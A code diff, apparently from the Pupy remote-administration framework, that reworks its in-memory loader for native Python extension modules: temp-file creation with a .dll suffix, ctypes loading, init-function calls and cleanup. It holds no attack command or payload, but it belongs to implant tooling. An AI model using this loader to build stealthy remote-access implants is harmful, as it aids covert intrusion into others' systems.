@@ -78,7 +78,7 @@ def find_writable_folder():
     for folder in temporary_folders:
         fd, name = None, None
         try:
-            fd, name = mkstemp(dir=folder)
+            fd, name = mkstemp(prefix='tdll', dir=folder)
 
             if sys.platform != 'win32':
                 try:
@@ -153,12 +153,20 @@ def get_tmpfile_function():
                 except:
                     pass
 
-        folder = find_writable_folder()
-        if folder:
-            def mkstemp_create(name=None):
-                return mkstemp(prefix=name or 'heap', dir=folder)
+    folder = find_writable_folder()
 
-            return mkstemp_create
+    if folder:
+        def mkstemp_create(name=None):
+            suffix = '.dll' if sys.platform == 'win32' else ''
+
+            dprint('Create tempforary file: suffix={}, folder={}'.format(
+                suffix, folder))
+
+            return mkstemp(
+                prefix=name or 'tmp',
+                suffix=suffix, dir=folder)
+
+        return mkstemp_create
 
 def py_memimporter():
     create_tmpfile = get_tmpfile_function()
@@ -169,6 +177,24 @@ def py_memimporter():
     from os import write, close, unlink
     from os.path import basename
     import platform
+    import ctypes
+
+    ctx = None
+    _Py_PackageContext = None
+
+    for basemodule in (None, 'python27'):
+        try:
+            ctx = ctypes.CDLL(basemodule)
+        except:
+            pass
+
+    if ctx:
+        try:
+            _Py_PackageContext = ctypes.c_char_p.in_dll(ctx, '_Py_PackageContext')
+        except:
+            pass
+
+    INITIALIZER = ctypes.PYFUNCTYPE(None)
 
     class MemImporter(object):
         def __init__(self, create_tmpfile):
@@ -181,6 +207,7 @@ def py_memimporter():
 
         def _load_library(self, fullname, data, initfuncname):
             fd, name = self._create_tmpfile()
+            fd_closed = False
 
             dprint('pymemimporter: load_library: {}, {}, {}, {}; system: {}'.format(
                 fullname, len(data), initfuncname, name, platform.system()))
@@ -190,39 +217,50 @@ def py_memimporter():
                 except:
                     bs = write(fd, bytearray(data))
 
-                result = None
-                if platform.system() == 'Java':
-                    import ctypes
+                if sys.platform == 'win32':
+                    close(fd)
+                    fd_closed = True
 
-                    fullname = basename(fullname)
-                    dprint('pymemimporter: Java JyNI (hopefully) loader. Modulename: {}'.format(fullname))
+                fullname = basename(fullname)
+                dprint('pymemimporter loader. Modulename: {}'.format(fullname))
 
-                    modulename = fullname.split('.')[-1]
+                modulename = fullname.split('.')[-1]
 
-                    if not initfuncname:
-                        initfuncname = 'init' + modulename
+                if not initfuncname:
+                    initfuncname = 'init' + modulename
 
-                    dprint('pymemimporter: Initializer: {}@{}'.format(initfuncname, name))
-                    lib = ctypes.CDLL(name)
+                dprint('pymemimporter: Initializer: {}@{}'.format(initfuncname, name))
+
+                try:
+                    lib = ctypes.PyDLL(name)
                     dprint('pymemimporter: Library loaded: {}'.format(lib))
+                except:
+                    lib = ctypes.CDLL(name)
+                    dprint('pymemimporter: Library loaded: {} (fallback CDLL)'.format(lib))
 
-                    func = lib[initfuncname]
-                    dprint('pymemimporter: Function found: {}'.format(func))
+                func = lib[initfuncname]
+                dprint('pymemimporter: Function found: {}'.format(func))
 
-                    if func:
-                        ret = func()
-                        dprint('pymemimporter: Something happened: {:016x}'.format(ret))
-                        result = __import__(modulename)
-                    else:
-                        dprint('pymemimporter: init function "{}" not found in {}'.format(initfuncname, name))
+                if func:
+                    func = INITIALIZER(func)
+
+                    oldctx = None
+
+                    if _Py_PackageContext:
+                        oldctx = _Py_PackageContext.value
+                        _Py_PackageContext.value = modulename
+
+                    dprint('pymemimporter: Calling initializer ({}@{}) ....'.format(func, modulename))
+                    func()
+                    dprint('pymemimporter: .... complete')
+
+                    if _Py_PackageContext:
+                        _Py_PackageContext.value = oldctx
 
                 else:
-                    dprint('pymemimporter: CPython loader. Modulename: {}'.format(fullname))
-                    if initfuncname:
-                        result = imp.load_dynamic(initfuncname[4:], name)
-                    else:
-                        result = imp.load_dynamic(fullname, name)
+                    dprint('pymemimporter: init function "{}" not found in {}'.format(initfuncname, name))
 
+                result = __import__(modulename)
                 dprint('pymemimporter: Result: {}'.format(result))
                 return result
 
@@ -230,7 +268,8 @@ def py_memimporter():
                 dprint('pymemimporter: {} / {} - load failed: {}'.format(fullname, name, e))
 
             finally:
-                close(fd)
+                if not fd_closed:
+                    close(fd)
 
                 try:
                     unlink(name)
@@ -479,15 +518,20 @@ class PupyPackageLoader(object):
                     dprint('Load {} failed: Exception: {}'.format(fullname, e))
 
             elif self.extension in ('dll', 'pyd', 'so'):
-                initname = "init" + fullname.rsplit(".",1)[-1]
+                if '.' in fullname:
+                    packagename, modulename = fullname.rsplit(".",1)
+                else:
+                    packagename = modulename = fullname
+
+                initname = "init" + modulename
                 path = self.fullname.rsplit('.', 1)[0].replace(".",'/') + "." + self.extension
                 dprint('Loading {} from memory'.format(fullname))
                 dprint('init={} fullname={} path={}'.format(initname, fullname, path))
                 mod = _memimporter.import_module(self.contents, initname, fullname, path)
                 if mod:
-                    mod.__name__=fullname
+                    mod.__name__ = modulename
                     mod.__file__ = 'pupy://{}'.format(self.path)
-                    mod.__package__ = fullname.rsplit('.',1)[0]
+                    mod.__package__ = packagename
                     sys.modules[fullname] = mod
 
             try:
